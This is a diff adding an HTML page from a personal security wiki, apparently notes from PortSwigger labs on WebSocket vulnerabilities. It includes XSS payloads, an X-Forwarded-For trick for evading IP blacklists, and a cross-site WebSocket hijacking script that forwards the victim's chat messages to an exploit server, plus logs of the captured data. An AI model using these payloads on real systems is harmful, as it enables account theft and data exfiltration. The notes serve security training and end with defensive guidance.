@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../../../img/favicon.ico" />
+    <title>Websocket - Garfield's wiki</title>
+    <link rel="stylesheet" href="../../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Websocket";
+        var mkdocs_page_input_path = "Security/Concepts/WebApplication/Websocket.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../../.." class="icon icon-home"> Garfield's wiki
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../../..">Home Lab Network Topology</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Hack</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/CTF_Resource/">CTF Resources</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/OSINT_Resource/">OSINT Resource</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/Vulnerability_Resource/">Vulnerability Resources</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/common_command/">Common COmmands</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/exploit_tools/">Exploit tools</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Hack/information_gathering/">Information gathering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Linux</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" >GeneralLinux</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Boot_Methods/">Linux boot methods</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Commands/">Linux Commands</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Directory/">Linux Directory</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Network_Configuration_Files/">Linux Network Configuration Files</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_OS_Setup/">Linux OS Setup</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Programming/">linux programming</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Scheduling/">Linux Scheduling</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Security/">Linux security</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_Shell_Scripting/">Linux shell scripting</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/Linux_User_Environment/">Linux User Environment</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/VIM_Editor_Commands/">VIM editor commands</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/GeneralLinux/kernel_parameters/">Kernel Parameters</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" >LinuxServers</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/LinuxServers/Database_Servers/">Database Servers</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/LinuxServers/File_Servers/">File Servers</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/LinuxServers/Mail_Servers/">Mail Servers</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/LinuxServers/Printing_Server/">Install HP print</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../../../Linux/LinuxServers/Web_Servers/">Webserver</a>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Networking</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Networking/Mobile_Device_Management/">Mobile Device Management</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Networking/VM_Server/">VM Server</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Networking/ports_and_protocols/">Ports &amp; Protocols</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Networking/vpnserver/">VPN Server</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Security</span></p>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" >Concepts</a>
+    <ul class="current">
+                <li class="toctree-l2"><a class="reference internal" href="../../cyber_kill_chain/">Cyber Kill Chain</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../defensive_security/">Defensive Security</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../goverance_and_regulation/">Goverance and Regulation</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../../security_principles/">Security Principles</a>
+                </li>
+                <li class="toctree-l2 current"><a class="reference internal current" >WebApplication</a>
+    <ul class="current">
+                <li class="toctree-l3"><a class="reference internal" href="../Web_Large_Language_Models/">Web Large Language Models</a>
+                </li>
+                <li class="toctree-l3 current"><a class="reference internal current" href="#">Websocket</a>
+    <ul class="current">
+    <li class="toctree-l4"><a class="reference internal" href="#manipulating-and-modifying-web-socket">Manipulating and modifying web socket</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#web-socket-vulnerabilties">Web socket vulnerabilties</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#manipulating-websocket-messages-vulnerability">Manipulating WebSocket Messages Vulnerability</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#how-to-perform-attack">How to perform attack</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#mainpulating-websocket-handshake">Mainpulating websocket handshake</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#how-to-perform">how to perform</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#cross-site-websockets">Cross site websockets</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#how-to-perform_1">How to perform</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#example-of-vulnerable-csrf-token">Example of vulnerable csrf token</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#how-to-perform-csrf">How to perform csrf</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#secure-websockets">Secure websockets</a>
+    </li>
+    </ul>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="../api_testing/">API Testing</a>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="../path_traversal/">Path Traversal</a>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="../web_training/">Web Application Training (Port Swinger)</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" >Defense</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../../Defense/tshark/">Tshark</a>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Windows Server</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Windows%20Server/Active_Directory/">Active Directory</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Windows%20Server/Configure_Microsoft_Entra_ID/">Configure Microsoft Entra ID</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Windows%20Server/Identity_Management/">Create, Configure, and manage identies</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../../Windows%20Server/Microsoft_Entra_Identity/">Microsoft Entra Identity</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../..">Garfield's wiki</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Security</li>
+          <li class="breadcrumb-item">Concepts</li>
+          <li class="breadcrumb-item">WebApplication</li>
+      <li class="breadcrumb-item active">Websocket</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="websocket">Websocket</h1>
+<ul>
+<li>Intercept &amp; modify WebSocket</li>
+<li>Replay &amp; Generate new websocket messages</li>
+<li>Manipulate Websocket connections</li>
+</ul>
+<h2 id="manipulating-and-modifying-web-socket">Manipulating and modifying web socket</h2>
+<ul>
+<li>Proxy to intercept websocket messages</li>
+<li>Repeater send to repeater</li>
+<li>Edit and send web socket messages</li>
+<li>When you click "connect", Burp will attempt to carry out the configured handshake and display the result.</li>
+</ul>
+<h2 id="web-socket-vulnerabilties">Web socket vulnerabilties</h2>
+<ul>
+<li>User supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilties such as SQL injection or XML external entity injection.</li>
+<li>Some blind vulnerabilties reached via WebSockets might only be detectable using out-of-band (OAST) techniques</li>
+<li>Attacker-controlled data is transmitted via WebSockets to other application uses. Might lead to XSS or other client-side vulnerabilties</li>
+</ul>
+<h2 id="manipulating-websocket-messages-vulnerability">Manipulating WebSocket Messages Vulnerability</h2>
+<p>Input: {"Message":"Hello Carlos"}
+Output:</p>
+<pre><code>&lt;td&gt;Hello Carlos&lt;/td&gt;
+
+</code></pre>
+<p>Can change input:</p>
+<pre><code>{&quot;Message&quot;:&quot;&lt;img src=1 onerror='alert(1)'&gt;&quot;}
+
+</code></pre>
+<p>Output:</p>
+<pre><code>&lt;td&gt;&lt;img src=1 onerror='alert(1)'&gt;&lt;/td&gt;
+
+</code></pre>
+<h2 id="how-to-perform-attack">How to perform attack</h2>
+<p>Proxy -&gt; Websocket history
+Message sent to server gets sent to repeater
+Modify the contents and send to server and see what happens</p>
+<pre><code>&quot;message&quot;:&quot;&lt;img src=1 onerror='alert(1);'&gt;&quot;
+
+</code></pre>
+<h2 id="mainpulating-websocket-handshake">Mainpulating websocket handshake</h2>
+<p>Misplaced HTTP headers x-forwarded-for header
+attack surface introduced by custom HTTP headers</p>
+<h2 id="how-to-perform">how to perform</h2>
+<ul>
+<li>obfuscate data: oNeRrOr=alert<code>1</code></li>
+</ul>
+<p>Add X-Forwarded-For: ip to trick web socket to continue even though ip got blacklisted</p>
+<h2 id="cross-site-websockets">Cross site websockets</h2>
+<p>Cross Site webSocket hijacking involves a Cross Site Request Forgery (CSRF)</p>
+<ul>
+<li>Perform unauthorized actions masquerading as the victim user. As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.</li>
+<li>Retrieve sensitive data that the user can access. Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.</li>
+</ul>
+<h2 id="how-to-perform_1">How to perform</h2>
+<p>In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.</p>
+<h2 id="example-of-vulnerable-csrf-token">Example of vulnerable csrf token</h2>
+<pre><code>GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket
+
+</code></pre>
+<p>Session transmitted by single cookie</p>
+<h2 id="how-to-perform-csrf">How to perform csrf</h2>
+<pre><code>&lt;script&gt;
+    var ws = new WebSocket('wss://0a95006c04c880c180fc763e009e00c7.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send(&quot;READY&quot;);
+    };
+    ws.onmessage = function(event) {
+        fetch('https://exploit-0a000011045c801f807d75ef01cd00cf.exploit-server.net/log?' + event.data, {method:'GET'});
+    };
+&lt;/script&gt;
+
+</code></pre>
+<pre><code>10.0.4.128      2025-05-28 02:36:15 +0000 &quot;GET /log?{%22user%22:%22You%22,%22content%22:%22I%20forgot%20my%20password%22} HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&quot;
+10.0.4.128      2025-05-28 02:36:15 +0000 &quot;GET /log?{%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&amp;apos;s%20wy3yu4q2voqav42ylmec%22} HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&quot;
+
+</code></pre>
+<h2 id="secure-websockets">Secure websockets</h2>
+<ul>
+<li>Use the wss:// protocol (WebSockets over TLS). Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.</li>
+<li>Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.</li>
+<li>Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.</li>
+</ul>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Web_Large_Language_Models/" class="btn btn-neutral float-left" title="Web Large Language Models"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../api_testing/" class="btn btn-neutral float-right" title="API Testing">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Web_Large_Language_Models/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../api_testing/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../../../..";</script>
+    <script src="../../../../js/theme_extra.js"></script>
+    <script src="../../../../js/theme.js"></script>
+      <script src="../../../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
